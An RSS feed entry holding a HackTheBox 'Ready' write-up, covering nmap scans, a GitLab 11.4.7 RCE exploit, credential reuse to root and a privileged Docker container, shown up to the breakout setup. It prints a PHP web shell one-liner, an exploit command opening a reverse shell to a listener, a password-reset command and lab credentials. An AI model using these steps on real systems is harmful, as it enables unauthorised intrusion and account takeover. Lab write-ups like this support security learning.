<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Medium on 5ysk3y Pwnz</title>
    <link>https://5ysk3y.github.io/tags/medium/</link>
    <description>Recent content in Medium on 5ysk3y Pwnz</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-us</language>
    <lastBuildDate>Tue, 06 Apr 2021 00:00:00 +0000</lastBuildDate><atom:link href="https://5ysk3y.github.io/tags/medium/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>Ready [Medium] - Linux</title>
      <link>https://5ysk3y.github.io/htb/guides/ready/</link>
      <pubDate>Tue, 06 Apr 2021 00:00:00 +0000</pubDate>
      
      <guid>https://5ysk3y.github.io/htb/guides/ready/</guid>
      <description>Overview Ready was a quick an easy box that uses an outdated and vulnerable version of GitLab to allow initial exploitation and shell access to a hosted docker container. From there, root elevation within the container is required so that it&amp;rsquo;s underlying configration can be abused in order to provide root access to the host machine.</description>
      <content>
  &lt;figure class=&#34;left&#34; &gt;
    &lt;img src=&#34;https://5ysk3y.github.io/images/guides/htb/ready.png&#34;   /&gt;
    
  &lt;/figure&gt;


&lt;h1 id=&#34;overview&#34;&gt;Overview&lt;/h1&gt;
&lt;p&gt;Ready was a quick an easy box that uses an outdated and vulnerable version of GitLab to allow initial exploitation and shell access to a hosted docker container. From there, root elevation within the container is required so that it&amp;rsquo;s underlying configration can be abused in order to provide root access to the host machine. Let&amp;rsquo;s see how I did all that!&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id=&#34;nmap-scan&#34;&gt;NMAP Scan&lt;/h1&gt;
&lt;p&gt;For reference here&amp;rsquo;s a full (script/version enumeration) outline of the top 1000 ports on the machine:&lt;/p&gt;
&lt;h5 id=&#34;initial-scan&#34;&gt;Initial Scan:&lt;/h5&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;Nmap scan report &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; ready.htb &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;10.10.10.220&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
Host is up, received conn-refused &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;0.024s latency&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;.
Scanned at 2021-03-31 16:05:21 BST &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; 13s
Not shown: &lt;span style=&#34;color:#ae81ff&#34;&gt;998&lt;/span&gt; closed ports
Reason: &lt;span style=&#34;color:#ae81ff&#34;&gt;998&lt;/span&gt; conn-refused
PORT     STATE SERVICE REASON  VERSION
22/tcp   open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Ubuntu Linux; protocol 2.0&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
| ssh-hostkey:
|   &lt;span style=&#34;color:#ae81ff&#34;&gt;3072&lt;/span&gt; 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;RSA&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC82vTuN1hMqiqUfN+Lwih4g8rSJjaMjDQdhfdT8vEQ67urtQIyPszlNtkCDn6MNcBfibD/7Zz4r8lr1iNe/Afk6LJqTt3OWewzS2a1TpCrEbvoileYAl/Feya5PfbZ8mv77+MWEA+kT0pAw1xW9bpkhYCGkJQm9OYdcsEEg1i+kQ/ng3+GaFrGJjxqYaW1LXyXN1f7j9xG2f27rKEZoRO/9HOH9Y+5ru184QQXjW/ir+lEJ7xTwQA5U1GOW1m/AgpHIfI5j9aDfT/r4QMe+au+2yPotnOGBBJBz3ef+fQzj/Cq7OGRR96ZBfJ3i00B/Waw/RI19qd7+ybNXF/gBzptEYXujySQZSu92Dwi23itxJBolE6hpQ2uYVA8VBlF0KXESt3ZJVWSAsU3oguNCXtY7krjqPe6BZRy+lrbeska1bIGPZrqLEgptpKhz14UaOcH9/vpMYFdSKr24aMXvZBDK1GJg50yihZx8I9I367z0my8E89+TnjGFY2QTzxmbmU&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;
|   &lt;span style=&#34;color:#ae81ff&#34;&gt;256&lt;/span&gt; b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;ECDSA&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBH2y17GUe6keBxOcBGNkWsliFwTRwUtQB3NXEhTAFLziGDfCgBV7B9Hp6GQMPGQXqMk7nnveA8vUz0D7ug5n04A&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;
|   &lt;span style=&#34;color:#ae81ff&#34;&gt;256&lt;/span&gt; 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;ED25519&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKfXa+OM5/utlol5mJajysEsV4zb/L0BJ1lKxMPadPvR
5080/tcp open  http    syn-ack nginx
|_http-favicon: Unknown favicon MD5: F7E3D97F404E71D302B3239EEF48D5F2
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
| http-robots.txt: &lt;span style=&#34;color:#ae81ff&#34;&gt;53&lt;/span&gt; disallowed entries &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;40&lt;/span&gt; shown&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
| / /autocomplete/users /search /api /admin /profile
| /dashboard /projects/new /groups/new /groups/*/edit /users /help
| /s/ /snippets/new /snippets/*/edit /snippets/*/raw
| /*/*.git /*/*/fork/new /*/*/repository/archive* /*/*/activity
| /*/*/new /*/*/edit /*/*/raw /*/*/blame /*/*/commits/*/*
| /*/*/commit/*.patch /*/*/commit/*.diff /*/*/compare /*/*/branches/new
| /*/*/tags/new /*/*/network /*/*/graphs /*/*/milestones/new
| /*/*/milestones/*/edit /*/*/issues/new /*/*/issues/*/edit
| /*/*/merge_requests/new /*/*/merge_requests/*.patch
|_/*/*/merge_requests/*.diff /*/*/merge_requests/*/edit
| http-title: Sign in &lt;span style=&#34;color:#ae81ff&#34;&gt;\x&lt;/span&gt;C2&lt;span style=&#34;color:#ae81ff&#34;&gt;\x&lt;/span&gt;B7 GitLab
|_Requested resource was http://ready.htb:5080/users/sign_in
|_http-trane-info: Problem with XML parsing of /evox/about
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
&lt;span style=&#34;color:#75715e&#34;&gt;# Nmap done at Wed Mar 31 16:05:34 2021 -- 1 IP address (1 host up) scanned in 13.73 seconds&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;As well as a full, but simple, port scan for good measure:&lt;/p&gt;
&lt;h5 id=&#34;full-scan&#34;&gt;Full Scan:&lt;/h5&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;Nmap scan report &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; ready.htb &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;10.10.10.220&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
Host is up &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;0.022s latency&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;.
Not shown: &lt;span style=&#34;color:#ae81ff&#34;&gt;65533&lt;/span&gt; closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
5080/tcp open  onscreen
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;initial-enumeration&#34;&gt;Initial Enumeration&lt;/h1&gt;
&lt;p&gt;Following the NMAP scans shown above, we can see that theres 2 ports:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;22/tcp&lt;/strong&gt; (ssh)&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;5080/tcp&lt;/strong&gt; (www)&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Initially the most interesting port is 5080&amp;ndash; an unusual port to run NGINX on, but it can be looked at none-the-less.&lt;/p&gt;
&lt;p&gt;Visting the site and we can see that it&amp;rsquo;s actually a Gitlab instance. We can sign up and get access, and establish that there is a repository in existence named &lt;code&gt;ready-channel&lt;/code&gt;:&lt;/p&gt;

  &lt;figure class=&#34;left&#34; &gt;
    &lt;img src=&#34;https://5ysk3y.github.io/images/guides/htb/ready/20210331174542.png&#34;   /&gt;
    
  &lt;/figure&gt;


&lt;p&gt;Looking at the contents, it looks like its an incredibly(!) old version of the &lt;a href=&#34;https://github.com/drupal/drupal&#34; target=&#34;_blank&#34;&gt;Drupal CMS&lt;/a&gt;
 - looking at the included CHANGELOG file:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;$ head CHANGELOG.txt

Drupal 7.56, 2017-06-21
-----------------------
- Fixed security issues &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;access bypass&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;. See SA-CORE-2017-003.

Drupal 7.55, 2017-06-07
-----------------------
- Fixed incompatibility with PHP versions 7.0.19 and 7.1.5 due to duplicate
  DATE_RFC7231 definition.
- Made Drupal core pass all automated tests on PHP 7.1.
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;In total, the repository owner has made a total of 4 commits, most of them excessive in terms of the amount of &amp;ldquo;changes&amp;rdquo; made. This makes it difficult to parse through changes, at a glance, for anything sensitive.&lt;/p&gt;
&lt;p&gt;Looking around the filesystem, there are some interesting things if you look closely. First, a set of potential MySQL creds:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;$databases &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;array&lt;/span&gt; (
  &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;default&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&amp;gt;&lt;/span&gt;
  &lt;span style=&#34;color:#66d9ef&#34;&gt;array&lt;/span&gt; (
    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;default&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&amp;gt;&lt;/span&gt;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;array&lt;/span&gt; (
      &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;database&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;drupal&amp;#39;&lt;/span&gt;,
      &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;username&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;drupaluser&amp;#39;&lt;/span&gt;,
      &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;password&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;%%cHzhNC=k9yYN!T&amp;#39;&lt;/span&gt;,
      &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;host&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;localhost&amp;#39;&lt;/span&gt;,
      &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;port&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;,
      &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;driver&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;mysql&amp;#39;&lt;/span&gt;,
      &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;prefix&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;,
    ),
  ),
);
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;blockquote&gt;
&lt;p&gt;&lt;a href=&#34;http://ready.htb:5080/dude/ready-channel/blob/master/sites/default/settings.php&#34;&gt;http://ready.htb:5080/dude/ready-channel/blob/master/sites/default/settings.php&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;There also appears to be a shell file, showing as 8 months old, located here:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;?&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;php&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt;( &lt;span style=&#34;color:#a6e22e&#34;&gt;isset&lt;/span&gt;( $_REQUEST[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;c&amp;#39;&lt;/span&gt;] ) ) { &lt;span style=&#34;color:#a6e22e&#34;&gt;system&lt;/span&gt;( $_REQUEST[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;c&amp;#39;&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39; 2&amp;gt;&amp;amp;1&amp;#39;&lt;/span&gt; ); }
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;blockquote&gt;
&lt;p&gt;&lt;a href=&#34;http://ready.htb:5080/dude/ready-channel/blob/master/sites/default/files/shell.php&#34;&gt;http://ready.htb:5080/dude/ready-channel/blob/master/sites/default/files/shell.php&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Some time was spent trying to find a defined &lt;code&gt;base_url&lt;/code&gt; but I wasn&amp;rsquo;t able to find one outside of default definitions. From there, a version number was enumerated via the sites &lt;code&gt;/help&lt;/code&gt; page - this is also available as a link in the top right hand corner of the page:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;GitLab Community Edition 11.4.7&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Looking at exploitDB there is indeed a CVE for this version:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;$ searchsploit gitlab 11.4.7
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                                           |  Path
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
GitLab 11.4.7 - RCE &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Authenticated&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;2&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;                                                                                                                                                                  | ruby/webapps/49334.py
GitLab 11.4.7 - Remote Code Execution &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Authenticated&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;1&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;                                                                                                                                                | ruby/webapps/49257.py
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Grabbing one of these and running it verbatim gives us a shell as the git user (albeit in a Docker container):&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;$ python3 49334.py -u syskey -p password -g http://ready.htb -l 10.10.14.8 -P &lt;span style=&#34;color:#ae81ff&#34;&gt;9001&lt;/span&gt;                             &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; ⨯
&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;+&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; authenticity_token: VHwOXloRm01plhWdGqA9+DOR2WBpGR+fxfgVtKGvgY6l/GQ+zce4ijRD5ISpJ55L5rE14SQk3WezNZ5jK3hqPg&lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;+&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Creating project with random name: project266
&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;+&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Running Exploit
&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;+&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Exploit completed successfully!
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;hr&gt;
&lt;h1 id=&#34;user-pwn&#34;&gt;User Pwn&lt;/h1&gt;
&lt;p&gt;Once on the box, a quick poke a round was in order but, honestly, familiarity with Gitlab setups (let alone a docker variant) is limited in my own experience so the easiest thing to start with was an enumeration script like LinPEAS.&lt;/p&gt;
&lt;p&gt;As it so happens, one of the features for LinPEAS is to enumerate Gitlab files to dump useful information, such as:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;{&amp;quot;id&amp;quot;=&amp;gt;2,&amp;quot;email&amp;quot;=&amp;gt;&amp;quot;dude@ready.com&amp;quot;,&amp;quot;encrypted_password&amp;quot;=&amp;gt;&amp;quot;$2a$10$NOMTXhO31vqykicMa6zj3O.F5PIyI9q/S4c.v22eMSfXNDdtpI2Mm&amp;quot;}

&amp;quot;id&amp;quot;=&amp;gt;3,&amp;quot;email&amp;quot;=&amp;gt;&amp;quot;mitroglou@ready.com&amp;quot;,&amp;quot;encrypted_password&amp;quot;=&amp;gt;&amp;quot;$2a$10$4vZAglOnEdNEe1SoNj1IE.RfotOt9gPnOXBEihjd7QBhsUmgmAdLi&amp;quot;}

{&amp;quot;id&amp;quot;=&amp;gt;1,&amp;quot;email&amp;quot;=&amp;gt;&amp;quot;admin@example.com&amp;quot;,&amp;quot;encrypted_password&amp;quot;=&amp;gt;&amp;quot;$2a$10$.Kc4bwq3BqLCEzAGJVIJFeK4emNnucvAqk1vCv4Yp45yy2nmrFa.2&amp;quot;}

{&amp;quot;id&amp;quot;=&amp;gt;4, &amp;quot;email&amp;quot;=&amp;gt;&amp;quot;test@test.gr&amp;quot;,&amp;quot;encrypted_password&amp;quot;=&amp;gt;&amp;quot;$2a$10$7xK1UPcwvjWIo4ioCz28GeFSt.NR00AHsY2AF.gWzaWwikRVXCTXa&amp;quot;}

gitlab_rails[&#39;smtp_password&#39;] = &amp;quot;wW59U!ZKMbG9+*#h&amp;quot;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;As expected, attempting to crack the hashes doesn&amp;rsquo;t yield any results - at least not in a quick amount of time, namely as they&amp;rsquo;re bcrypt hashes. That said, running as the git user has its benefits because passwords can be reset rather easily if needed:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-ruby&#34; data-lang=&#34;ruby&#34;&gt;gitlab&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;rails runner &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;user = User.find_by(email: &amp;#34;dude@ready.com&amp;#34;); user.password = &amp;#34;ReallySecurePassword123!&amp;#34;; user.password_confirmation = &amp;#34;ReallySecurePassword123!&amp;#34;; user.save!&amp;#39;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;After resetting passwords for dude, admin and mitroglou with Gitlab and logging in, there&amp;rsquo;s no additional useful information hidden. A few potential passwords have been garnered though; the SMTP password LinPeas grabbed, above, as well as the MySQL credentials we gathered earlier from poking around GitLab manually.&lt;/p&gt;
&lt;p&gt;In this case, a quick manual password spray was in order - initially against the &lt;code&gt;dude&lt;/code&gt; user - the win was much better than that though as using &lt;code&gt;su&lt;/code&gt; with the &lt;code&gt;smtp_password&lt;/code&gt; value gets us root on the container:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;git@gitlab:~$ su
Password:
root@gitlab:/var/opt/gitlab#
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Now we have root, so lets try and breakout this contianer.&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id=&#34;root-pwn&#34;&gt;Root Pwn&lt;/h1&gt;
&lt;p&gt;Once on as the root user, it&amp;rsquo;s generally favorable to run another enumeration scanner, like LinPEAS, to try and aggregate anything you may miss.&lt;/p&gt;
&lt;p&gt;In this case it highlights an uncommon folder, although this isn&amp;rsquo;t all too difficult to find manually, either.&lt;/p&gt;
&lt;p&gt;&lt;code&gt;/opt/backup&lt;/code&gt;:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;root@gitlab:/opt/backup# ls -la
total 112
drwxr-xr-x 2 root root  4096 Dec  7 09:25 .
drwxr-xr-x 1 root root  4096 Dec  1 16:23 ..
-rw-r--r-- 1 root root   872 Dec  7 09:25 docker-compose.yml
-rw-r--r-- 1 root root 15092 Dec  1 16:23 gitlab-secrets.json
-rw-r--r-- 1 root root 79639 Dec  1 19:20 gitlab.rb
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Inside here there is a &lt;code&gt;docker-compose.yml&lt;/code&gt; file&amp;ndash; presumably the one used to create the container we&amp;rsquo;re in, based on the contents:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-yml&#34; data-lang=&#34;yml&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;version&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;2.4&amp;#39;&lt;/span&gt;

&lt;span style=&#34;color:#f92672&#34;&gt;services&lt;/span&gt;:
  &lt;span style=&#34;color:#f92672&#34;&gt;web&lt;/span&gt;:
    &lt;span style=&#34;color:#f92672&#34;&gt;image&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;gitlab/gitlab-ce:11.4.7-ce.0&amp;#39;&lt;/span&gt;
    &lt;span style=&#34;color:#f92672&#34;&gt;restart&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;always&lt;/span&gt;
    &lt;span style=&#34;color:#f92672&#34;&gt;hostname&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;gitlab.example.com&amp;#39;&lt;/span&gt;
    &lt;span style=&#34;color:#f92672&#34;&gt;environment&lt;/span&gt;:
      &lt;span style=&#34;color:#f92672&#34;&gt;GITLAB_OMNIBUS_CONFIG&lt;/span&gt;: |&lt;span style=&#34;color:#e6db74&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;        external_url &amp;#39;http://172.19.0.2&amp;#39;
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;        redis[&amp;#39;bind&amp;#39;]=&amp;#39;127.0.0.1&amp;#39;
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;        redis[&amp;#39;port&amp;#39;]=6379
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;        gitlab_rails[&amp;#39;initial_root_password&amp;#39;]=File.read(&amp;#39;/root_pass&amp;#39;)&lt;/span&gt;        
    &lt;span style=&#34;color:#f92672&#34;&gt;networks&lt;/span&gt;:
      &lt;span style=&#34;color:#f92672&#34;&gt;gitlab&lt;/span&gt;:
        &lt;span style=&#34;color:#f92672&#34;&gt;ipv4_address&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;172.19.0.2&lt;/span&gt;
    &lt;span style=&#34;color:#f92672&#34;&gt;ports&lt;/span&gt;:
      - &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;5080:80&amp;#39;&lt;/span&gt;
      &lt;span style=&#34;color:#75715e&#34;&gt;#- &amp;#39;127.0.0.1:5080:80&amp;#39;&lt;/span&gt;
      &lt;span style=&#34;color:#75715e&#34;&gt;#- &amp;#39;127.0.0.1:50443:443&amp;#39;&lt;/span&gt;
      &lt;span style=&#34;color:#75715e&#34;&gt;#- &amp;#39;127.0.0.1:5022:22&amp;#39;&lt;/span&gt;
    &lt;span style=&#34;color:#f92672&#34;&gt;volumes&lt;/span&gt;:
      - &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;./srv/gitlab/config:/etc/gitlab&amp;#39;&lt;/span&gt;
      - &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;./srv/gitlab/logs:/var/log/gitlab&amp;#39;&lt;/span&gt;
      - &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;./srv/gitlab/data:/var/opt/gitlab&amp;#39;&lt;/span&gt;
      - &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;./root_pass:/root_pass&amp;#39;&lt;/span&gt;
    &lt;span style=&#34;color:#f92672&#34;&gt;privileged&lt;/span&gt;: &lt;span style=&#34;color:#66d9ef&#34;&gt;true&lt;/span&gt;
    &lt;span style=&#34;color:#f92672&#34;&gt;restart&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;unless-stopped&lt;/span&gt;
    &lt;span style=&#34;color:#75715e&#34;&gt;#mem_limit: 1024m&lt;/span&gt;

&lt;span style=&#34;color:#f92672&#34;&gt;networks&lt;/span&gt;:
  &lt;span style=&#34;color:#f92672&#34;&gt;gitlab&lt;/span&gt;:
    &lt;span style=&#34;color:#f92672&#34;&gt;driver&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;bridge&lt;/span&gt;
    &lt;span style=&#34;color:#f92672&#34;&gt;ipam&lt;/span&gt;:
      &lt;span style=&#34;color:#f92672&#34;&gt;config&lt;/span&gt;:
        - &lt;span style=&#34;color:#f92672&#34;&gt;subnet&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;172.19.0.0&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;/16&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;This also shows one very interesting, and &lt;em&gt;very&lt;/em&gt; vulnerable, thing:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-yml&#34; data-lang=&#34;yml&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;privileged&lt;/span&gt;: &lt;span style=&#34;color:#66d9ef&#34;&gt;true&lt;/span&gt;
